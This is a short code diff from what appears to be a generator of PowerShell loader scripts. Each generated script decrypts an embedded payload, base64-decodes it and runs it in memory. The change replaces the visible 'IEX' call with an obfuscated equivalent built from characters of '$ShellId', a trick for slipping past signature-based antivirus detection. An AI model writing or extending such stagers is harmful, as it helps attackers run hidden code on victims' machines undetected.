@@ -198,6 +198,6 @@ function ${funcName}($d, $k) {
 }
 
 $${decodedVar} = ${funcName} $${dataVar} $${keyVar}
-IEX([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($${decodedVar})))
+& ( $ShellId[1]+$ShellId[13]+'x') ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($${decodedVar})))
 `
 }
